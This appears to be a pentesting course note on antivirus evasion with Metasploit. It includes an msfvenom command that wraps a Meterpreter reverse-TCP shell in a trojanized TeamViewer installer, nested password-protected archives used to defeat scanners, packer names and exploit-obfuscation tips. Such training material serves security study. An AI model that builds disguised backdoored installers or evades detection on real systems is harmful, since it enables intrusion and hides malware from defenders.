
## Evasion Techniques

### 1. Signature-Based AV Bypass

- AV detects known malicious patterns.
    
- Payloads need **obfuscation** or **customization**.
    

---

### 2. AES-Tunneled Meterpreter

- Meterpreter sessions use **AES encryption** to bypass:
    
    - IDS/IPS
        
    - Traffic inspection
        
- **Limitation:** Still detectable by static scans pre-execution.
    

---

### 3. Using Executable Templates

Embed payloads in **legitimate executables**:

```
msfvenom -p windows/x86/meterpreter_reverse_tcp \
  LHOST=10.10.14.2 LPORT=8080 -k \
  -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai -i 5 \
  -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe
```

**Flags:**

- `-k` → Keep original functionality
    
- `-x` → Use custom executable as a template
    
- `-e` → Encode payload (e.g., `x86/shikata_ga_nai`)
    
- `-i` → Number of encoding iterations
    

---

### 4. Packing with Archives

Use **nested, password-protected archives** to bypass static detection:

```
rar a ~/test.rar -p ~/test.js
mv test.rar test
rar a test2.rar -p test
mv test2.rar test2
```

**Testing:**

```
msf-virustotal -k <API_KEY> -f test2
```

- Original file → ~11/59 detections
    
- Double-archived file → 0 detections
    

---

### 5. Packers

Packers **compress and obfuscate executables**:

- **Popular Packers:**
    
    - UPX
        
    - MPRESS
        
    - The Enigma Protector
        
    - Themida
        
    - ExeStealth
        
- Learn more: **PolyPack Project**
    

---

### 6. Exploit Coding & Obfuscation

Write **custom, non-patterned code** to avoid detection.  
Example target structure in code:

```ruby
'Targets' => [
  ['Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 }],
],
```

**Avoid:**

- Obvious **NOP sleds**
    
- Static buffer patterns
    
- Reusing **popular exploit signatures**
    

**Pro Tip:** Always **test in a sandboxed lab** before live deployment.

---

# References

- **MSFVenom Payload Cheat Sheet**
    
- **Metasploit Unleashed** – Offensive Security
    
- **PolyPack Project** – Analysis of packers and obfuscators
    
- **Penetration Testing Frameworks** for custom exploit design